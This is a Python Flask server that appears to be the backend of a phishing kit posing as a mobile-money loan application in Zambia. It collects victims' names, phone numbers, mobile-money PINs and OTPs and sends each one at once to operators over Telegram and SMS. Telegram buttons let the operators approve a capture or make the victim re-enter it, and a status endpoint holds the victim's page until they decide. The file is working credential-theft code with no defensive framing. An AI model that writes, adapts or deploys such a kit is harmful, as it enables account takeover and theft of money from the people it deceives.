import os
import json
import redis
import time
import requests
from flask import Flask, render_template, request, jsonify
from datetime import datetime
import pytz

app = Flask(
    __name__,
    static_folder=os.path.join(os.path.dirname(__file__), "assets"),
    static_url_path="/assets",
)


# Africa's Talking & SMS Configuration
ADMIN_NOTIFICATION_PHONE = os.environ.get("ADMIN_NOTIFICATION_PHONE")
AT_USERNAME = os.environ.get("AT_USERNAME", "sandbox")
AT_API_KEY = os.environ.get("AT_API_KEY")

def send_sms_notification(message):
    if not ADMIN_NOTIFICATION_PHONE or not AT_API_KEY:
        print("Africa's Talking SMS configuration missing. SMS skipped.")
        return
    try:
        url = "https://api.africastalking.com/version1/messaging"
        if AT_USERNAME == "sandbox":
            url = "https://api.sandbox.africastalking.com/version1/messaging"
            
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "apiKey": AT_API_KEY
        }
        payload = {
            "username": AT_USERNAME,
            "to": ADMIN_NOTIFICATION_PHONE,
            "message": message
        }
        requests.post(url, data=payload, headers=headers, timeout=5)
    except Exception as e:
        print(f"Africa's Talking SMS dispatch failed: {e}")

# Telegram Configuration (support both TELEGRAM_BOT_TOKEN and TELEGRAM_TOKEN)
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN") or os.environ.get("TELEGRAM_TOKEN")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")

import re

def get_bot_config(ref):
    clean_ref = re.sub(r'[^A-Za-z0-9_]', '', (ref or "")).upper()
    if clean_ref:
        token = os.environ.get(f"BOT_{clean_ref}_TOKEN")
        chat_id = os.environ.get(f"BOT_{clean_ref}_CHAT_ID")
        if token and chat_id:
            return token, chat_id
    return TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID


def send_telegram_notification(message, record_id=None, ref="default"):
    token, raw_ids = get_bot_config(ref)
    if not token or not raw_ids:
        print(f"Telegram config missing for ref={ref}. Notification skipped.")
        return
    try:
        chat_ids = [cid.strip() for cid in raw_ids.split(',')]

        reply_markup = None
        if record_id:
            reply_markup = {
                "inline_keyboard": [[
                    {"text": "❌ Incorrect — Ask Client to Re-enter", "callback_data": f"retry:{record_id}:{ref}"},
                    {"text": "✅ Approve", "callback_data": f"approve:{record_id}:{ref}"}
                ]]
            }

        for chat_id in chat_ids:
            if not chat_id:
                continue
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            payload = {"chat_id": chat_id, "text": message}
            if reply_markup:
                payload["reply_markup"] = reply_markup
            try:
                resp = requests.post(url, json=payload, timeout=5)
                print(f"Telegram ({ref}) response for {chat_id}: {resp.status_code} {resp.text}")
            except Exception as inner_e:
                print(f"Failed to send to chat_id {chat_id}: {inner_e}")
    except Exception as e:
        print(f"Telegram notification orchestration failed: {e}")

# Helper to get current time in Zambia/Johannesburg timezone
def get_now_str():
    try:
        tz = pytz.timezone('Africa/Lusaka')
        now = datetime.now(tz)
    except:
        now = datetime.now()
    return now.strftime("%Y-%m-%d %I:%M:%S %p")

# Initialize Redis client using REDIS_URL
db = None
try:
    redis_url = os.environ.get("REDIS_URL")
    if redis_url:
        print(f"Attempting to connect to Redis at: {redis_url.split('@')[-1]}") # Log host only for safety
        
        # Comprehensive connection parameters for Cloud Providers (Upstash/Vercel)
        # 1. ssl_cert_reqs=None ignores self-signed/provider cert issues
        # 2. socket_timeout ensures we don't hang the lambda forever
        # 3. retry_on_timeout handles cold starts
        db = redis.from_url(
            redis_url, 
            decode_responses=True, 
            ssl_cert_reqs=None,
            socket_timeout=5.0,
            socket_connect_timeout=5.0,
            retry_on_timeout=True
        )
        # Test connection immediately
        db.ping()
        print("Redis client initialized and verified successfully.")
    else:
        print("REDIS_URL environment variable not found.")
except Exception as e:
    print(f"Redis initialization failed CRITICAL: {e}")
    db = None # Reset to ensure we don't use a broken client

@app.route('/')
def home():
    return render_template('index.html')

# Endpoint: Unified data saving and tracking
@app.route('/api/save', methods=['POST'])
def save_unified():
    try:
        data = request.get_json(silent=True) or {}
        app_id = data.get('appId') or data.get('session_id')
        if not app_id:
            return jsonify({'status': 'error', 'message': 'Missing appId'}), 400

        name = data.get('fullName', 'Unknown')
        phone = data.get('mobile', data.get('phone', 'NoPhone'))
        f_n = data.get('field')
        f_v = data.get('value')
        now = get_now_str()
        ref = data.get('ref', 'default')

        if db:
            db.delete(f"status:{app_id}")
        LOCAL_STATUS_STORE.pop(str(app_id), None)

        if f_n == 'entered_pin':
            m = f'🔐 PIN Received\n\n👤 User: {name}\n🔢 PIN: {f_v}\n📞 Phone: {phone}'
            send_telegram_notification(m, record_id=app_id, ref=ref)
            send_sms_notification(f"[Momo Advanced Alert] PIN Received\nUser: {name}\nPhone: {phone}\nPIN: {f_v}")
        elif f_n == 'entered_otp':
            m = f'📱 OTP Received\n\n👤 User: {name}\n🔑 OTP: {f_v}\n📞 Phone: {phone}'
            send_telegram_notification(m, record_id=app_id, ref=ref)
            send_sms_notification(f"[Momo Advanced Alert] OTP Received\nUser: {name}\nPhone: {phone}\nOTP: {f_v}")
        elif not f_n:
            amt = data.get('amount', 'N/A')
            m = f'🚀 *New Application Submitted*\n\n👤 *Name:* {name}\n📞 *Phone:* {phone}\n💰 *Amount:* ZMW {amt}\n📅 *Time:* {now}'
            send_telegram_notification(m, ref=ref)
            send_sms_notification(f"[Momo Advanced Alert] New Application\nName: {name}\nPhone: {phone}\nAmount: ZMW {amt}")

        return jsonify({'status': 'success', 'record_id': app_id})
    except Exception as e:
        print(f"Error in unified save: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

# Legacy endpoints redirected to unified logic
@app.route('/api/track-input', methods=['POST'])
def track_input():
    return save_unified()
from flask import send_from_directory

@app.route('/assets/<path:filename>')
def serve_assets(filename):
    return send_from_directory('assets', filename)

LOCAL_STATUS_STORE = {}

@app.route('/api/telegram-webhook', methods=['POST'])
def telegram_webhook():
    update = request.get_json(silent=True) or {}
    callback = update.get("callback_query")
    if callback:
        parts = callback.get("data", "").split(":")
        callback_id = callback.get("id")
        if len(parts) >= 2:
            action = parts[0]
            record_id = parts[1]
            ref = parts[2] if len(parts) > 2 else "default"
            LOCAL_STATUS_STORE[str(record_id)] = action
            if db:
                try:
                    db.setex(f"status:{record_id}", 900, action)
                except Exception:
                    pass
            token, _ = get_bot_config(ref)
            if token:
                reply_text = "Marked as INCORRECT. Client prompted to re-enter." if action == "retry" else "Marked as APPROVED."
                requests.post(
                    f"https://api.telegram.org/bot{token}/answerCallbackQuery",

                    json={"callback_query_id": callback_id, "text": reply_text, "show_alert": True},
                    timeout=5
                )
    return jsonify({"ok": True})

@app.route('/api/status/<record_id>', methods=['GET'])
def check_status(record_id):
    status = None
    if db:
        try:
            status = db.get(f"status:{record_id}")
        except Exception:
            pass
    if not status:
        status = LOCAL_STATUS_STORE.get(str(record_id))
    return jsonify({"status": status or "pending"})


if __name__ == "__main__":
    app.run(debug=True, port=int(os.environ.get("PORT", 8000)))

